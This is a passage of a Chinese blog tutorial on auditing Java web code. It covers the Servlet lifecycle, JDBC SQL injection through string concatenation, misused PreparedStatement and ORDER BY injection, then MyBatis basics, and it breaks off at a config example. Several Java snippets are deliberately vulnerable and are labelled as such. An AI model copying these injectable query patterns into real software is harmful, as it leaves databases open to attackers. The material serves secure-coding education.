<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="审计流程 Servlet生命周期  Servlet生命周期可被定义为从创建直到毁灭的整个过程。以下是Servlet遵循的过程[1]：   Servlet初始化后调用 init () 方法。   Servlet调用 service() 方法来处理客户端的请求。   Servlet销毁前调用 destroy() 方法。   最后，Servlet是由JVM的垃圾回收器进行垃圾回收的。   简单介绍一下使">
<meta property="og:type" content="article">
<meta property="og:title" content="Java代码审计漏洞点(基础)">
<meta property="og:url" content="https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/index.html">
<meta property="og:site_name" content="X2n.">
<meta property="og:description" content="审计流程 Servlet生命周期  Servlet生命周期可被定义为从创建直到毁灭的整个过程。以下是Servlet遵循的过程[1]：   Servlet初始化后调用 init () 方法。   Servlet调用 service() 方法来处理客户端的请求。   Servlet销毁前调用 destroy() 方法。   最后，Servlet是由JVM的垃圾回收器进行垃圾回收的。   简单介绍一下使">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/image-20250401162609929.png">
<meta property="article:published_time" content="2025-04-01T03:13:02.000Z">
<meta property="article:modified_time" content="2025-04-23T14:57:52.704Z">
<meta property="article:author" content="X2n.">
<meta property="article:tag" content="SQL注入">
<meta property="article:tag" content="Java">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="XXE">
<meta property="article:tag" content="SSRF">
<meta property="article:tag" content="MyBatis">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/image-20250401162609929.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Java代码审计漏洞点(基础)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="X2n." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/04/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&text=Java代码审计漏洞点(基础)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&is_video=false&description=Java代码审计漏洞点(基础)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java代码审计漏洞点(基础)&body=Check out this article: https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&name=Java代码审计漏洞点(基础)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&t=Java代码审计漏洞点(基础)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">审计流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Servlet生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.</span> <span class="toc-text">Servlet审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Springboot%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">Springboot审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">JDBC中的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">动态拼接参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.</span> <span class="toc-text">错误使用预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-By%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.3.</span> <span class="toc-text">Order By注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mybatis%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">Mybatis中的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MyBatis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">MyBatis基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MyBatis%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">MyBatis主要特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mybatis%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">Mybatis的工作原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mybatis%E7%9A%84%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">Mybatis的使用步骤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyBatis%E4%B8%AD-%E5%92%8C-%E5%8C%BA%E5%88%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text">MyBatis中#{}和${}区别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-%EF%BC%9A"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">对于#{}：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">对于${}:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84"><span class="toc-number">2.2.3.</span> <span class="toc-text">存在SQL注入漏洞的${}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORDER-BY%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">ORDER BY注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">IN注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LIKE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">LIKE注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%82%B9"><span class="toc-number">2.6.</span> <span class="toc-text">SQL相关函数点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">3.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%BA%93"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞相关库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.2.</span> <span class="toc-text">测试实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-xml-sax-XMLReader"><span class="toc-number">3.2.1.</span> <span class="toc-text">org.xml.sax.XMLReader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-jdom2-input-SAXBuilder"><span class="toc-number">3.2.2.</span> <span class="toc-text">org.jdom2.input.SAXBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-dom4j-io-SAXReader"><span class="toc-number">3.2.3.</span> <span class="toc-text">org.dom4j.io.SAXReader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javax-xml-parsers-DocumentBuilder"><span class="toc-number">3.2.4.</span> <span class="toc-text">javax.xml.parsers.DocumentBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%90%8C%E7%90%86"><span class="toc-number">3.2.5.</span> <span class="toc-text">其它同理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">4.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">可能存在问题的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B-2"><span class="toc-number">4.2.</span> <span class="toc-text">测试实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HttpURLConnection-getInputStream"><span class="toc-number">4.2.1.</span> <span class="toc-text">HttpURLConnection.getInputStream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HttpCLient-execute"><span class="toc-number">4.2.2.</span> <span class="toc-text">HttpCLient.execute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%90%8C%E7%90%86-2"><span class="toc-number">4.2.3.</span> <span class="toc-text">其它同理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Java代码审计漏洞点(基础)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">X2n.</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-01T03:13:02.000Z" class="dt-published" itemprop="datePublished">2025-04-01</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/MyBatis/" rel="tag">MyBatis</a>, <a class="p-category" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>, <a class="p-category" href="/tags/SSRF/" rel="tag">SSRF</a>, <a class="p-category" href="/tags/XXE/" rel="tag">XXE</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="审计流程">审计流程</h2>
<h3 id="Servlet生命周期"><code>Servlet</code>生命周期</h3>
<p><img src="/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/image-20250401162609929.png" alt="image-20250401162609929"></p>
<p><code>Servlet</code>生命周期可被定义为从创建直到毁灭的整个过程。以下是<code>Servlet</code>遵循的过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>：</p>
<ul>
<li>
<p><code>Servlet</code>初始化后调用 <strong>init ()</strong> 方法。</p>
</li>
<li>
<p><code>Servlet</code>调用 <strong>service()</strong> 方法来处理客户端的请求。</p>
</li>
<li>
<p><code>Servlet</code>销毁前调用 <strong>destroy()</strong> 方法。</p>
</li>
<li>
<p>最后，<code>Servlet</code>是由<code>JVM</code>的垃圾回收器进行垃圾回收的。</p>
</li>
</ul>
<p>简单介绍一下使用到的几种方法。</p>
<ul>
<li><strong><code>init()</code>方法</strong></li>
</ul>
<p><code>init</code>方法被设计成只调用一次。它在第一次创建<code>Servlet</code>时被调用，在后续每次用户请求时不再调用。因此，它是用于一次性初始化。</p>
<ul>
<li><strong><code>service()</code>方法</strong></li>
</ul>
<p><code>service()</code>方法是执行实际任务的主要方法。<code>Servlet</code>容器（即<code>Web</code>服务器）调用<code>service()</code>方法来处理来自客户端（浏览器）的请求，并把格式化的响应写回给客户端。</p>
<p>每次服务器接收到一个<code>Servlet</code>请求时，服务器会产生一个新的线程并调用服务。<code>service()</code>方法检查<code>HTTP</code>请求类型（<code>GET、POST、PUT、DELETE </code>等），并在适当的时候调用<code>doGet、doPost、doPut，doDelete</code>等方法</p>
<ul>
<li><strong><code>destroy</code>方法</strong></li>
</ul>
<p><code>destroy()</code>方法只会被调用一次，在<code>Servlet</code>生命周期结束时被调用。<code>destroy()</code>方法可以让您的<code>Servlet</code>关闭数据库连接、停止后台线程、把<code>Cookie</code>列表或点击计数器写入到磁盘，并执行其他类似的清理活动。</p>
<h3 id="Servlet审计">Servlet审计</h3>
<p>找<code>Controller</code>文件，找<code>mapping</code>路由。</p>
<p>…</p>
<h3 id="Springboot审计">Springboot审计</h3>
<p>找<code>mapping</code></p>
<p>…</p>
<h2 id="SQL注入">SQL注入</h2>
<p><code>Java</code>中常见的连接数据库的方式：<code>Mybatis</code>、<code>JDBC</code>、<code>Hibernate</code>等。在<code>Java</code>中存在注入的参数类型要为字符型。</p>
<h3 id="JDBC中的SQL注入"><code>JDBC</code>中的SQL注入</h3>
<p><code>JDBC</code>中常用的几个执行<code>SQL</code>语句的方式<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup>，分别为：</p>
<ul>
<li>
<p><code>Statement</code>：用于执行普通的<code>SQL</code>语句，不带有参数。</p>
</li>
<li>
<p><code>PrepareedStatement</code>：用于执行预编译的<code>SQL</code>语句，可以带有参数，防止<code>SQL</code>注入。</p>
</li>
<li>
<p><code>CallableStatement</code>：用于执行数据库存储过程。</p>
</li>
</ul>
<h4 id="动态拼接参数">动态拼接参数</h4>
<p>直接将参数拼接到了<code>SQL</code>语句中执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//动态拼接字符串</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = &#x27;&quot;</span>+ id +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">ResultSetrs= statement.executeQuery(sql);</span><br></pre></td></tr></table></figure>
<h4 id="错误使用预编译">错误使用预编译</h4>
<p>原理：<code>PreparedStatement</code>不会对拼接的字符串进行预处理。</p>
<p>正确的使用预编译，不存在注入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安全代码</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">        preparestatement.setString(<span class="number">1</span>, username);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure>
<p>错误使用预编译，存在注入！！！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//没有正确使用预编译方式，SQL语句还是进行了动态拼接</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users where id = &#x27;&quot;</span>+ id +<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure>
<p>简单说，由于开发人员疏忽或经验不足等原因，虽然使用了预编译 <code>PreparedStatement</code> ，但没有根据标准流程对参数进行标记，依旧使用了动态拼接SQL语句的方式，进而造成SQL注入漏洞。</p>
<h4 id="Order-By注入"><code>Order By</code>注入</h4>
<p>在使用<code>PreparedStatement</code>预编译时，会将传递的任意参数预编译，进而变为字符串。而<code>order by</code>需要的是<strong>字段名</strong>，而<strong>不是字符串</strong>。所以，在使用<code>order by</code>时，就不能使用预编译了。因此，<code>order by</code>位置也是出现<code>sql</code>注入重灾区。</p>
<p><strong>字段名</strong>是<code>SQL</code>语句的一部分，而字符串不是。预编译后<code>SQL</code>语句就会变成<code>ORDER BY 'username'</code>，故报错。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//错误使用，报错⚠️。</span></span><br><span class="line">Stringsql=<span class="string">&quot;SELECT * FROM users ORDER BY ?&quot;</span>;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">        preparestatement.setString(<span class="number">1</span>, username);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure>
<p>所以，代码中常常使用的方法是拼接字段，拼接不当就会出现注入问题。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//order by 的sql注入。</span></span><br><span class="line">Stringsql=<span class="string">&quot;select * from users&quot;</span>+<span class="string">&quot; order by &quot;</span>+ id;</span><br><span class="line">PreparedStatementpreparestatement= conn.prepareStatement(sql);</span><br><span class="line">ResultSetrs= preparestatement.executeQuery();</span><br></pre></td></tr></table></figure>
<p>实际代码应用中，常常使用白名单的方式去限制<strong>字段名</strong>，进而防止注入。</p>
<h3 id="Mybatis中的SQL注入"><code>Mybatis</code>中的<code>SQL</code>注入</h3>
<p><code>MyBatis</code>是一个流行的<code> Java</code> 持久层框架，用于简化与数据库的交互。它通过提供一种对象关系映射（<code>ORM</code>）的方式，使得<code> Java</code> 程序员可以更方便地执行数据库操作（如查询、插入、更新、删除）。与传统的<code> JDBC</code> 相比，<code>MyBatis</code> 提供了更高层次的抽象，并且比<code> JPA</code>（<code>Hibernate</code> 等）更灵活、易于配置。</p>
<h4 id="MyBatis基础知识"><code>MyBatis</code>基础知识</h4>
<h5 id="MyBatis主要特点"><code>MyBatis</code>主要特点</h5>
<ul>
<li><strong>SQL映射：</strong><code>MyBatis</code>允许开发者使用原生的<code>SQL</code>语句来操作数据库。它将<code>SQL</code>查询与<code>Java</code>方法进行映射，使得开发者可以完全控制<code>SQL</code>执行过程，同时享受框架带来的简化和支持。</li>
<li><strong>动态SQL：</strong> <code>MyBatis</code>支持动态生成<code>SQL</code>查询，提供了<code>&lt;if&gt;</code>、<code>&lt;choose&gt;</code>、<code>&lt;foreach&gt;</code>等标签，可以根据不同的条件动态生成<code>SQL</code>，避免了冗长且复杂的条件判断逻辑。</li>
<li><strong>简洁的XML配置：</strong> <code>MyBatis</code> 使用<code> XML</code> 文件来配置数据库映射，开发者通过定义 <code>SQL</code> 语句和映射规则，控制<code> Java</code> 对象与数据库表之间的映射关系。</li>
<li><strong>接口和注解支持：</strong><code> MyBatis</code> 提供了基于接口的<code>API</code>，开发者可以在<code> Java</code> 接口中定义数据库操作方法，并通过注解或者 <code>XML</code>配置映射 <code>SQL</code> 语句。</li>
<li><strong>强大的缓存机制：</strong> <code>MyBatis</code> 提供了一级缓存和二级缓存。一级缓存是基于 <code>SqlSession</code> 级别的缓存，二级缓存是跨 <code>SqlSession</code> 共享的缓存，默认情况下启用。</li>
<li><strong>支持事物管理：</strong> <code>MyBatis</code> 支持与 <code>Java</code> 的事务管理整合，确保数据库操作的原子性和一致性。</li>
</ul>
<h5 id="Mybatis的工作原理"><code>Mybatis</code>的工作原理</h5>
<ul>
<li>
<p>**<code>SqlSessionFactory</code>:**这是 MyBatis 的核心工厂类，负责创建 <code>SqlSession</code> 对象。<code>SqlSession</code> 是 MyBatis 中用于执行 <code>SQL</code> 语句的主要接口，它通过配置文件读取数据库连接信息，创建并维护数据库连接。</p>
</li>
<li>
<p>**<code>Mapper XML</code>文件：**在<code>MyBatis</code>中，<code>SQL</code>语句通常在<code>XML</code>配置文件中定义，开发者需要为每个数据库操作编写对应的<code>Mapper</code>文件。这个文件会包含<code>SQL</code>语句及其映射规则。</p>
</li>
<li>
<p>**<code>Mapper</code>接口：**开发者通常会创建接口，定义一些方法，这些方法通过<code>XML</code>或注解来与具体的<code>SQL</code>语句进行绑定。</p>
</li>
<li>
<p>**映射过程：**当应用程序调用 <code>SqlSession</code> 的方法时，<code>MyBatis</code> 会根据 <code>Mapper</code> 接口或注解提供的<code>SQL</code>语句信息执行相应的数据库操作，并将结果自动映射为<code>Java</code>对象，返回给开发者。</p>
</li>
</ul>
<h5 id="Mybatis的使用步骤"><code>Mybatis</code>的使用步骤</h5>
<ul>
<li><strong>配置<code>Mybatis</code>:</strong> 通过<code>mybatis-config.xml</code> 文件进行配置，配置数据库连接、缓存、日志等。</li>
<li>**定义<code>Mapper</code>: ** 创建<code>Mapper</code>接口或类，定义<code>SQL</code>操作的方法。</li>
<li><strong>编写<code>Mapper XML</code>:</strong> 为每个<code>SQL</code>操作编写对应的<code>XML</code>文件，定义<code>SQL</code>语句与<code>Mapper</code>方法的映射关</li>
<li><strong>创建<code>SqlSessionFactory</code>:</strong> 通过配置文件创建 <code>SqlSessionFactory</code>，获取 <code>SqlSession</code>。</li>
<li>**执行<code>SQL</code>操作：**通过<code>SqlSession</code>执行<code>SQL</code>语句，获取查询结果或执行更新操作。</li>
</ul>
<p><strong><code>MyBatis</code>的代码示例</strong></p>
<p>以下是一个简单的<code>MyBatis</code>的使用示例。</p>
<p><code>MyBatis</code>配置文件<code>mybatis-config.xml</code></p>
